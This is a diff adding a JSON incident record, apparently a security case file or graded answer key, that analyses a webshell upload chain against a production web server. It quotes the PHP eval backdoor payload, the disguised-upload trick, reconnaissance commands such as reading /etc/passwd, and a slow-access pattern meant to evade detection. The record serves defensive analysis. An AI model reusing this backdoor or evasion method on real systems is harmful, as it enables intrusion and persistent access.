@@ -1,0 +1,20 @@
+{
+  "case_id": "CHAIN-CASE-14",
+  "is_malicious": true,
+  "attack_type": "Malicious_Upload_After_Scan",
+  "risk_level": "HIGH",
+  "attacker_ip": "203.0.113.188",
+  "victim_asset": "web-prod-01",
+  "evidence_log_ids": [
+    "LOG-20261118-1403",
+    "LOG-20261118-1404",
+    "LOG-20261118-1405",
+    "LOG-20261118-1409",
+    "LOG-20261118-1413",
+    "LOG-20261118-1414"
+  ],
+  "attack_chain_summary": "攻击源 203.0.113.188 于 10:00 探测 /upload.php 后，10:02 以 filename=\"c.php\" + Content-Type: image/jpeg 的双扩展名与 MIME 伪装上传隐蔽 Webshell（LOG-20261118-1403）；随后在 10:40、11:25、12:10、13:00、13:30、14:00、14:40 共 7 次访问，分别以 base64 编码的 echo bW9kZQ / id / ls / cat /etc/passwd / whoami / uname -a 作为参数（1404、1405、1409 等），间隔 25~45 分钟、响应体仅 96~240 字节——刻意规避「上传后立刻高频访问」的检测特征；14:00 那次 POST 的载荷解码后为 <?php eval($_POST[\"x\"])，确认是持久化后门。",
+  "recommended_action": "block_ip",
+  "requires_human_approval": true,
+  "unknown_items": "尚未确认该 Webshell 是否被其他 IP 复用，建议全量检索 /uploads/c.php 的访问记录。"
+}
